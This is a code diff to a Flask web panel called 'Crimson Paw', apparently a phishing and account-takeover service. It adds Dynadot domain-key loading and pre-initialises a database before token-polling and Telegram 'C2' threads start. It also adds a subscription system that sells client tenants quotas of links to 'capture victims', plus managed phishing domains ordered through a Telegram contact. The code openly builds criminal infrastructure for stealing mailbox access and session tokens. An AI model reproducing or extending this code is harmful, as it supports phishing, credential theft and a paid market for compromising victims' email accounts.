@@ -29,11 +29,28 @@ from core.stealth_gate import (
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# Initialize Dynadot API Key from saved settings if available
+try:
+    if SETTINGS_FILE.exists():
+        with open(SETTINGS_FILE, 'r', encoding='utf-8') as _f_init_cfg:
+            _d_init_cfg = json.load(_f_init_cfg)
+            if _d_init_cfg.get('dynadot_key'):
+                Config.DYNADOT_API_KEY = _d_init_cfg['dynadot_key'].strip()
+except Exception:
+    pass
+
 app = Flask(__name__)
 app.secret_key = os.environ.get('CRIMSON_SECRET_KEY', 'crimson_paw_obsidian_ruby_key_2026')
 app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(days=30)
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+# Initialize SQLite database and tables FIRST before starting any background daemons
+try:
+    db.init_db()
+    logger.info("Database initialized successfully prior to daemon launch.")
+except Exception as _e_init:
+    logger.error(f"Error pre-initializing database: {_e_init}")
+
 poller = TokenPoller()
 poller.start()
 refresher = TokenRefresher()
@@ -41,8 +58,9 @@ refresher.start()
 kw_watcher = keyword_watcher.KeywordWatcherThread(interval_seconds=45)
 kw_watcher.start()
 import telegram_c2
-tg_c2_bot = telegram_c2.TelegramC2BotThread(poll_interval=3)
-tg_c2_bot.start()
+tg_c2_bot = telegram_c2.get_c2_bot_thread(poll_interval=3)
+if not tg_c2_bot.is_alive():
+    tg_c2_bot.start()
 
 HTML_TEMPLATE = r'''
 <!DOCTYPE html>
@@ -1026,11 +1044,11 @@ HTML_TEMPLATE = r'''
 <body class="{{ 'role-operator' if user_role == 'operator' else 'role-admin' }}">
     <div class="sidebar" id="sidebar">
         <button type="button" class="toggle-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Collapse sidebar">❮</button>
-        <div class="sidebar-header" {% if user_role != 'operator' %}onclick="handleBrandLogoClick()"{% endif %} style="display:flex; align-items:center; gap:10px; cursor:{{ 'default' if user_role == 'operator' else 'pointer' }};" title="{{ platform_name or 'Crimson Paw' }}">
+        <div class="sidebar-header" onclick="handleBrandLogoClick()" style="display:flex; align-items:center; gap:10px; cursor:pointer;" title="{{ platform_name or 'Crimson Paw' }}">
             <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" style="width:28px; height:28px; border-radius:6px; border:1px solid var(--accent-glow); box-shadow:0 0 8px var(--accent-glow); object-fit:contain;">
             <div style="display:flex; flex-direction:column; overflow:hidden;">
                 <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">{{ platform_name or 'CRIMSON PAW' }}</span>
-                <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else ('var(--accent-color)' if is_master_admin else '#a49498') }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else ('MASTER HOST' if is_master_admin else 'ADMIN') }}</span>
+                <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else ('#a49498' if is_client_admin else 'var(--accent-color)') }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else ('USER' if is_client_admin else 'ADMIN') }}</span>
             </div>
         </div>
         <div class="nav-item {{ 'active' if user_role != 'operator' else '' }}" id="nav-dashboard" onclick="showPage('dashboard', this)"><span class="nav-icon">📊</span><span class="nav-text">Dashboard</span></div>
@@ -1040,8 +1058,13 @@ HTML_TEMPLATE = r'''
         <div class="nav-item" id="nav-extractor" onclick="showPage('extractor', this)"><span class="nav-icon">⚗️</span><span class="nav-text">Extractor & Sorter</span></div>
         <div class="nav-item" id="nav-b2b" onclick="showPage('b2b', this)"><span class="nav-icon">✉️</span><span class="nav-text">B2B Sender</span></div>
         <div class="nav-item" id="nav-sessions" onclick="showPage('sessions', this)"><span class="nav-icon">📡</span><span class="nav-text">Live Sessions</span></div>
+        {% if not is_client_admin and user_role != 'operator' %}
+        <div class="nav-item" id="nav-clients" onclick="showPage('clients', this)"><span class="nav-icon">💼</span><span class="nav-text">Client Tenants</span><span id="nav-badge-clients" style="display:none; font-size:10px; background:var(--accent-color); color:#fff; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
+        {% endif %}
+        {% if not is_client_admin %}
         <div class="nav-item" id="nav-operators" onclick="showPage('operators', this)"><span class="nav-icon">👥</span><span class="nav-text">Operators</span><span id="nav-badge-operators" style="display:none; font-size:10px; background:#58a6ff; color:#000; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
         <div class="nav-item" id="nav-audit" onclick="showPage('audit', this)"><span class="nav-icon">📋</span><span class="nav-text">Audit Trail</span><span id="nav-badge-audit" style="display:none; font-size:10px; background:var(--accent-color); color:#fff; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
+        {% endif %}
         <div class="nav-item" id="nav-settings" onclick="showPage('settings', this)"><span class="nav-icon">⚙️</span><span class="nav-text">Settings</span></div>
         <div class="nav-item" id="nav-logout" onclick="handleLogout()" style="margin-top:auto; color:var(--accent-color); border-top:1px solid var(--border-color);"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
     </div>
@@ -1136,7 +1159,7 @@ HTML_TEMPLATE = r'''
                             </div>
                             <div class="ab-search-box">
                                 <span class="ab-search-label">SEARCH</span>
-                                <input type="text" id="ab-table-search" placeholder="Search..." oninput="onTableSearch(this.value)">
+                                <input type="text" id="ab-table-search" placeholder="Search..." autocomplete="off" oninput="onTableSearch(this.value)">
                             </div>
                         </div>
                     </div>
@@ -2730,6 +2753,205 @@ HTML_TEMPLATE = r'''
             </div>
         </div>
 
+        <!-- Modal: Add New Subscribed Client (SaaS) -->
+        <div id="subscriberModal" class="modal-overlay">
+            <div class="modal" style="max-width: 580px;">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px;">
+                        <span>💼</span> <span>Provision Subscribed Client</span>
+                    </h2>
+                    <button class="close-btn" onclick="closeSubscriberModal()">&times;</button>
+                </div>
+                <div style="font-size:0.8rem; color:var(--text-secondary); line-height:1.5; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:12px; margin-bottom:16px;">
+                    🛡️ <b>Client Tenant Isolation:</b> This client will have their own scoped dashboard to deploy links and capture victims. They cannot access system settings, surveillance logs, or other clients' campaigns.
+                </div>
+                <form id="subscriber-form" onsubmit="saveSubscriber(event)" style="display:flex; flex-direction:column; gap:16px;">
+                    <div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                            <label class="token-label" style="margin:0;">CLIENT USERNAME</label>
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="rollSubscriberUsername()" style="padding:2px 8px; font-size:10px; display:inline-flex; align-items:center; gap:4px;">
+                                <span>🎲</span> Generate Name
+                            </button>
+                        </div>
+                        <input type="text" id="sub-username-input" class="lg-input" placeholder="e.g. ClientAlpha" required style="width:100%; font-family:monospace; font-weight:700; color:#58a6ff;">
+                    </div>
+                    <div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                            <label class="token-label" style="margin:0;">LOGIN PASSWORD</label>
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="rollSubscriberPassword()" style="padding:2px 8px; font-size:10px; display:inline-flex; align-items:center; gap:4px;">
+                                <span>🎲</span> Generate Key
+                            </button>
+                        </div>
+                        <input type="text" id="sub-password-input" class="lg-input" placeholder="Strong password or access key" required style="width:100%; font-family:monospace; color:#ffd32a; font-weight:700;">
+                    </div>
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                        <div>
+                            <label class="token-label" style="margin-bottom:4px; display:block;">SUBSCRIPTION DURATION</label>
+                            <select id="sub-duration-input" class="lg-input" style="width:100%;">
+                                <option value="7">7 Days (Trial)</option>
+                                <option value="30" selected>30 Days (1 Month)</option>
+                                <option value="90">90 Days (3 Months)</option>
+                                <option value="365">365 Days (1 Year)</option>
+                                <option value="0">Lifetime (No Expiry)</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="token-label" style="margin-bottom:4px; display:block;">PLAN TIER</label>
+                            <select id="sub-plan-input" class="lg-input" style="width:100%;">
+                                <option value="Starter">Starter (5 Links)</option>
+                                <option value="Pro" selected>Pro (15 Links)</option>
+                                <option value="Enterprise">Enterprise Unlimited</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="token-label" style="margin-bottom:4px; display:block;">MAX ACTIVE LINKS QUOTA</label>
+                        <input type="number" id="sub-quota-input" class="lg-input" value="15" min="1" max="1000" style="width:100%;">
+                    </div>
+                    <div style="display:flex; justify-content:flex-end; gap:10px; margin-top:8px;">
+                        <button type="button" class="btn btn-secondary" onclick="closeSubscriberModal()">Cancel</button>
+                        <button type="submit" class="btn btn-primary" style="display:flex; align-items:center; gap:6px;">
+                            <span>💾</span> Create Client Account
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Modal: Newly Created Subscribed Client Credentials Summary -->
+        <div id="clientCredentialsModal" class="modal-overlay">
+            <div class="modal" style="max-width: 560px; border:1px solid var(--border-color); background:var(--bg-sidebar);">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px; color:#3fb950;">
+                        <span>💼</span> Client Tenant Provisioned!
+                    </h2>
+                    <button class="close-btn" onclick="closeClientCredentialsModal()">&times;</button>
+                </div>
+                <div style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:16px;">
+                    Provide these credentials to your client. They have an isolated portal to deploy links and capture victims under their plan.
+                </div>
+                <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:16px; display:flex; flex-direction:column; gap:12px; margin-bottom:20px;">
+                    <div>
+                        <div style="font-size:10px; color:var(--text-secondary); text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">LOGIN PORTAL URL</div>
+                        <div id="sub-cred-url" style="font-family:monospace; color:#58a6ff; font-size:13px; margin-top:2px; word-break:break-all;"></div>
+                    </div>
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                        <div>
+                            <div style="font-size:10px; color:var(--text-secondary); text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">CLIENT USERNAME</div>
+                            <div id="sub-cred-user" style="font-family:monospace; color:#ffffff; font-size:15px; font-weight:800; margin-top:2px;"></div>
+                        </div>
+                        <div>
+                            <div style="font-size:10px; color:var(--text-secondary); text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">LOGIN PASSWORD</div>
+                            <div id="sub-cred-pass" style="font-family:monospace; color:#ffd32a; font-size:15px; font-weight:800; margin-top:2px;"></div>
+                        </div>
+                    </div>
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                        <div>
+                            <div style="font-size:10px; color:var(--text-secondary); text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">PLAN & QUOTA</div>
+                            <div id="sub-cred-plan" style="font-size:12px; color:var(--text-primary); margin-top:2px;"></div>
+                        </div>
+                        <div>
+                            <div style="font-size:10px; color:var(--text-secondary); text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">SUBSCRIPTION EXPIRES</div>
+                            <div id="sub-cred-expiry" style="font-size:12px; color:var(--accent-color); font-weight:700; margin-top:2px;"></div>
+                        </div>
+                    </div>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <button type="button" class="btn btn-secondary" onclick="closeClientCredentialsModal()">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="copyClientCredentialsPackage()" style="display:flex; align-items:center; gap:6px;">
+                        <span>📋</span> Copy Full Client Package
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal: Renew Subscription -->
+        <div id="renewSubscriberModal" class="modal-overlay">
+            <div class="modal" style="max-width: 480px;">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px;">
+                        <span>⏳</span> <span id="renew-modal-title">Renew Subscription</span>
+                    </h2>
+                    <button class="close-btn" onclick="closeRenewModal()">&times;</button>
+                </div>
+                <input type="hidden" id="renew-client-id" value="">
+                <div style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:16px;">
+                    Select an extension duration or choose a custom calendar date for <b id="renew-client-name" style="color:#ffffff;"></b>.
+                </div>
+                <div style="display:flex; flex-direction:column; gap:14px; margin-bottom:20px;">
+                    <div>
+                        <label class="token-label" style="margin-bottom:6px; display:block;">QUICK EXTENSION PRESETS</label>
+                        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px;">
+                            <button type="button" class="btn btn-secondary" onclick="executeRenewQuick(7)" style="padding:10px 4px; font-weight:700;">+7 Days</button>
+                            <button type="button" class="btn btn-primary" onclick="executeRenewQuick(30)" style="padding:10px 4px; font-weight:700;">+30 Days</button>
+                            <button type="button" class="btn btn-secondary" onclick="executeRenewQuick(90)" style="padding:10px 4px; font-weight:700;">+90 Days</button>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="token-label" style="margin-bottom:6px; display:block;">OR CUSTOM EXPIRY DATE</label>
+                        <div style="display:flex; gap:8px;">
+                            <input type="date" id="renew-custom-date" class="lg-input" style="flex:1;">
+                            <button type="button" class="btn btn-secondary" onclick="executeRenewCustom()" style="white-space:nowrap;">Apply Date</button>
+                        </div>
+                    </div>
+                </div>
+                <div style="display:flex; justify-content:flex-end;">
+                    <button type="button" class="btn btn-secondary" onclick="closeRenewModal()">Close</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal: Manage Client Allocated Domains -->
+        <div id="manageClientDomainsModal" class="modal-overlay">
+            <div class="modal" style="max-width: 560px;">
+                <div class="modal-header">
+                    <h2 style="display:flex; align-items:center; gap:8px;">
+                        <span>🌐</span> <span id="mcd-modal-title">Allocated Domains</span>
+                    </h2>
+                    <button class="close-btn" onclick="closeManageDomainsModal()">&times;</button>
+                </div>
+                <input type="hidden" id="mcd-client-id" value="">
+                <div style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:16px;">
+                    Domains assigned to <b id="mcd-client-name" style="color:#ffffff;"></b>. Only assigned domains appear in their Link Studio.
+                </div>
+                <!-- Assign New Domain Picker -->
+                <div style="display:flex; gap:8px; margin-bottom:16px; background:var(--bg-panel); border:1px solid var(--border-color); padding:12px; border-radius:8px;">
+                    <select id="mcd-domain-select" class="lg-input" style="flex:1;">
+                        <option value="">Select an owned domain to assign...</option>
+                    </select>
+                    <button type="button" class="btn btn-primary" onclick="executeAssignDomain()" style="white-space:nowrap;">
+                        <span>➕</span> Assign
+                    </button>
+                </div>
+                <!-- Current Assigned Domains List -->
+                <div id="mcd-domains-list" style="display:flex; flex-direction:column; gap:8px; max-height:260px; overflow-y:auto; margin-bottom:16px;">
+                    <div style="text-align:center; color:var(--text-secondary); padding:16px;">Loading assigned domains...</div>
+                </div>
+                <div style="display:flex; justify-content:flex-end;">
+                    <button type="button" class="btn btn-secondary" onclick="closeManageDomainsModal()">Close</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal: Client Order Domain via Telegram -->
+        <div id="buyDomainRequestModal" class="modal-overlay">
+            <div class="modal" style="max-width: 480px; text-align:center;">
+                <div class="modal-header" style="justify-content:center;">
+                    <div style="width:54px; height:54px; border-radius:50%; background:var(--badge-bg); border:1px solid var(--badge-border); display:flex; align-items:center; justify-content:center; font-size:26px; color:var(--accent-color); margin:0 auto 8px;">🌐</div>
+                </div>
+                <h2 style="margin:0 0 8px; font-size:18px;">Acquire a Managed Domain</h2>
+                <div style="font-size:0.88rem; color:var(--text-secondary); line-height:1.5; margin-bottom:20px;">
+                    Domains are warmed, provisioned, and assigned to your account directly by the Administrator. Contact below with your requested domain or keyword to order.
+                </div>
+                <div style="display:flex; flex-direction:column; gap:10px;">
+                    <a id="btn-order-domain-tg" href="https://t.me/icode_365_bot" target="_blank" class="btn btn-primary" style="display:flex; align-items:center; justify-content:center; gap:8px; padding:12px 18px; font-weight:800; font-size:14px; text-decoration:none;">
+                        <span>💬</span> Message Administrator on Telegram
+                    </a>
+                    <button type="button" class="btn btn-secondary" onclick="closeBuyDomainRequestModal()">Close</button>
+                </div>
+            </div>
+        </div>
+
         <div id="page-sessions" class="page">
             <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                 <h1>Live Sessions</h1>
@@ -2777,13 +2999,13 @@ HTML_TEMPLATE = r'''
 
         <!-- ═══════════════ OPERATORS MANAGEMENT PAGE ═══════════════ -->
         <div id="page-operators" class="page">
-            <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+            <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:16px;">
                 <div>
                     <h1 style="display:flex; align-items:center; gap:10px; margin:0;">
-                        <span>👥</span> Operator Management &amp; Access Delegation
+                        <span>👥</span> Delegated Operators
                     </h1>
-                    <div style="font-size:12px; color:#a49498; margin-top:4px;">
-                        Manage scoped operator accounts. Operators can ONLY access the Mailbox view and explore accounts explicitly delegated to them.
+                    <div style="font-size:12px; color:var(--text-secondary); margin-top:4px;">
+                        Manage subordinate operator delegations and mailbox access permissions.
                     </div>
                 </div>
                 <button class="btn btn-primary" onclick="openNewOperatorModal()" style="display:flex; align-items:center; gap:6px;">
@@ -2792,52 +3014,128 @@ HTML_TEMPLATE = r'''
             </div>
 
             <div class="page-body" style="display:flex; flex-direction:column; gap:20px;">
-                <!-- KPI Stat Cards Row -->
-                <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:16px;">
-                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
-                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(88,166,255,0.12); color:#58a6ff; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(88,166,255,0.3);">👥</div>
-                        <div>
-                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">TOTAL OPERATORS</div>
-                            <div id="op-kpi-total" style="font-size:22px; font-weight:800; color:#f0ebed; margin-top:2px;">0</div>
+                <!-- ── VIEW 1: DELEGATED OPERATORS ── -->
+                <div id="view-team-operators" style="display:flex; flex-direction:column; gap:20px;">
+
+                    <!-- KPI Stat Cards Row -->
+                    <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:16px;">
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(88,166,255,0.12); color:#58a6ff; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(88,166,255,0.3);">👥</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">TOTAL OPERATORS</div>
+                                <div id="op-kpi-total" style="font-size:22px; font-weight:800; color:#f0ebed; margin-top:2px;">0</div>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(63,185,80,0.12); color:#3fb950; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(63,185,80,0.3);">🟢</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ACTIVE OPERATORS</div>
+                                <div id="op-kpi-active" style="font-size:22px; font-weight:800; color:#3fb950; margin-top:2px;">0</div>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:var(--badge-bg); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid var(--badge-border);">📧</div>
+                            <div>
+                                <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">DELEGATED INBOXES</div>
+                                <div id="op-kpi-delegations" style="font-size:22px; font-weight:800; color:#ffffff; margin-top:2px;">0</div>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(255,159,67,0.12); color:#ff9f43; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(255,159,67,0.3);">⏸️</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">SUSPENDED</div>
+                                <div id="op-kpi-suspended" style="font-size:22px; font-weight:800; color:#ff9f43; margin-top:2px;">0</div>
+                            </div>
                         </div>
                     </div>
-                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
-                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(63,185,80,0.12); color:#3fb950; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(63,185,80,0.3);">🟢</div>
-                        <div>
-                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ACTIVE OPERATORS</div>
-                            <div id="op-kpi-active" style="font-size:22px; font-weight:800; color:#3fb950; margin-top:2px;">0</div>
+
+                    <!-- Main Operators Table Card -->
+                    <div class="card">
+                        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:16px;">
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <input type="text" id="op-search-filter" class="lg-input" placeholder="🔍 Search by operator name or victim..." style="width:260px; font-size:12px; padding:6px 12px;" oninput="filterOperatorsList()">
+                            </div>
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="loadOperators()" style="display:flex; align-items:center; gap:6px;">
+                                    <span>🔄</span> Refresh Table
+                                </button>
+                            </div>
                         </div>
-                    </div>
-                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
-                        <div style="width:42px; height:42px; border-radius:8px; background:var(--badge-bg); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid var(--badge-border);">📧</div>
-                        <div>
-                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">DELEGATED INBOXES</div>
-                            <div id="op-kpi-delegations" style="font-size:22px; font-weight:800; color:#ffffff; margin-top:2px;">0</div>
+                        <div id="operators-page-table-container" style="overflow-x:auto;">
+                            <div style="padding:24px; text-align:center; color:#a49498;">Loading operators...</div>
                         </div>
-                    </div>
-                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
-                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(255,159,67,0.12); color:#ff9f43; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(255,159,67,0.3);">⏸️</div>
-                        <div>
-                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">SUSPENDED</div>
-                            <div id="op-kpi-suspended" style="font-size:22px; font-weight:800; color:#ff9f43; margin-top:2px;">0</div>
-                        </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+        {% if not is_client_admin and user_role != "operator" %}
+        <!-- ═══════════════ CLIENT TENANTS (SAAS) PAGE ═══════════════ -->
+        <div id="page-clients" class="page">
+            <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:16px;">
+                <div>
+                    <h1 style="display:flex; align-items:center; gap:10px; margin:0;">
+                        <span>💼</span> Client Tenant Subscribers
+                    </h1>
+                    <div style="font-size:12px; color:var(--text-secondary); margin-top:4px;">
+                        Provision and manage paying commercial clients with isolated links, private victim captures, and subscription duration locks.
                     </div>
                 </div>
+                <button class="btn btn-primary" onclick="openNewSubscriberModal()" style="display:flex; align-items:center; gap:6px;">
+                    <span>➕</span> Add Subscribed Client
+                </button>
+            </div>
 
-                <!-- Main Operators Table Card -->
-                <div class="card">
-                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:16px;">
-                        <div style="display:flex; align-items:center; gap:8px;">
-                            <input type="text" id="op-search-filter" class="lg-input" placeholder="🔍 Search by operator name or victim..." style="width:260px; font-size:12px; padding:6px 12px;" oninput="filterOperatorsList()">
+            <div class="page-body" style="display:flex; flex-direction:column; gap:20px;">
+                <div id="view-team-subscribers" style="display:flex; flex-direction:column; gap:20px;">
+
+                    <!-- Client Subscribers KPI Cards Row -->
+                    <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:16px;">
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(63,185,80,0.12); color:#3fb950; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(63,185,80,0.3);">💼</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ACTIVE SUBSCRIBERS</div>
+                                <div id="sub-kpi-active" style="font-size:22px; font-weight:800; color:#3fb950; margin-top:2px;">0</div>
+                            </div>
                         </div>
-                        <div style="display:flex; align-items:center; gap:8px;">
-                            <button type="button" class="btn btn-secondary btn-sm" onclick="loadOperators()" style="display:flex; align-items:center; gap:6px;">
-                                <span>🔄</span> Refresh Table
-                            </button>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(255,159,67,0.12); color:#ff9f43; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(255,159,67,0.3);">⏳</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">EXPIRING SOON (&le;3d)</div>
+                                <div id="sub-kpi-expiring" style="font-size:22px; font-weight:800; color:#ff9f43; margin-top:2px;">0</div>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:var(--badge-bg); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid var(--badge-border);">🌐</div>
+                            <div>
+                                <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ASSIGNED DOMAINS</div>
+                                <div id="sub-kpi-domains" style="font-size:22px; font-weight:800; color:#ffffff; margin-top:2px;">0</div>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                            <div style="width:42px; height:42px; border-radius:8px; background:rgba(239,68,68,0.12); color:#ef4444; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(239,68,68,0.3);">❄️</div>
+                            <div>
+                                <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">EXPIRED / FROZEN</div>
+                                <div id="sub-kpi-frozen" style="font-size:22px; font-weight:800; color:#ef4444; margin-top:2px;">0</div>
+                            </div>
                         </div>
                     </div>
-                    <div id="operators-page-table-container" style="overflow-x:auto;">
-                        <div style="padding:24px; text-align:center; color:#a49498;">Loading operators...</div>
+
+                    <!-- Main Subscribers Table Card -->
+                    <div class="card">
+                        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:16px;">
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <input type="text" id="sub-search-filter" class="lg-input" placeholder="🔍 Search subscribers by username or plan..." style="width:260px; font-size:12px; padding:6px 12px;" oninput="filterSubscribersList()">
+                            </div>
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="loadSubscribers()" style="display:flex; align-items:center; gap:6px;">
+                                    <span>🔄</span> Refresh Table
+                                </button>
+                            </div>
+                        </div>
+                        <div id="subscribers-page-table-container" style="overflow-x:auto;">
+                            <div style="padding:24px; text-align:center; color:#a49498;">Loading subscribers...</div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -2975,6 +3273,7 @@ HTML_TEMPLATE = r'''
         </div>
 
         <!-- ═══════════════ SETTINGS PAGE ═══════════════ -->
+        {% endif %}
         <div id="page-settings" class="page" style="height: 100%; overflow: hidden; width: 100%;">
             <div class="page-body" style="flex: 1; padding: 32px 48px; width: 100%; box-sizing: border-box; overflow-y: auto;">
                 <!-- Category Tag -->
@@ -2993,7 +3292,7 @@ HTML_TEMPLATE = r'''
                 </div>
 
                 <!-- Segmented Horizontal Tab Navigation Bar (100% Full Width) -->
-                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid var(--border-color); border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat({{ '4' if is_master_admin else '3' }}, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
+                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid var(--border-color); border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat({{ '4' if (not is_client_admin and user_role != 'operator') else '3' }}, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
                     <button type="button" id="settings-tab-btn-account" onclick="window.switchSettingsTab('account')" style="background: var(--border-color); border: 1px solid var(--accent-color); color: #ffffff; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Account
                     </button>
@@ -3003,7 +3302,7 @@ HTML_TEMPLATE = r'''
